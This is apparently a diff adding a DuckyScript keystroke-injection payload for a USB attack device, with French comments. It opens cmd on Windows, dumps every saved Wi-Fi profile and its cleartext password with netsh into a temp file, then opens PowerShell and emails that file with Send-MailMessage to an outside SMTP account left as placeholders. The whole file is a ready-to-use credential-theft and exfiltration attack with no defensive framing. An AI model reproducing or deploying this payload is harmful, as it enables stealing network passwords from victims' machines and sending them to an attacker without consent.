@@ -1,0 +1,64 @@
+DELAY 500
+REM Démarrer l'exécution avec la touche GUI (touche Windows)
+GUI r
+DELAY 500
+
+REM Taper et exécuter CMD
+STRING cmd
+ENTER
+DELAY 500
+
+REM Récupérer tous les profils Wi-Fi et leurs mots de passe
+STRING cd %TEMP%
+ENTER
+DELAY 200
+STRING chcp 65001
+ENTER
+DELAY 200
+STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> passwifi.txt
+ENTER
+DELAY 2000
+STRING exit
+ENTER
+DELAY 1000
+
+
+REM Envoyer tous les profils Wi-Fi et leurs mots de passe par mail
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING cd $env:TEMP
+ENTER
+DELAY 200
+STRING $SMTPServer = "YOUR SMTP SERVER"
+ENTER
+DELAY 200
+STRING $SMTPFrom = "YOUR ACCOUNT SMTP"
+ENTER
+DELAY 200
+STRING $SMTPTo = "ACCOUNT DESTINTION"
+ENTER
+DELAY 200
+STRING $MessageSubject = "MDP WIFI"
+ENTER
+DELAY 200
+STRING $MessageBody = "Les MDP"
+ENTER
+DELAY 200
+STRING $Attachment = "passwifi.txt"
+ENTER
+DELAY 200
+STRING $SMTPUsername = "YOUR ACCOUNT SMTP"
+ENTER
+DELAY 200
+STRING $SMTPPassword = "YOUR MDP ACCOUNT SMTP"
+ENTER
+DELAY 200
+STRING Send-MailMessage -From $SMTPFrom -To $SMTPTo -Subject $MessageSubject -Body $MessageBody -SmtpServer $SMTPServer -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $SMTPUsername, (ConvertTo-SecureString $SMTPPassword -AsPlainText -Force)) -UseSsl -Attachment $Attachment
+ENTER
+DELAY 200
+
+
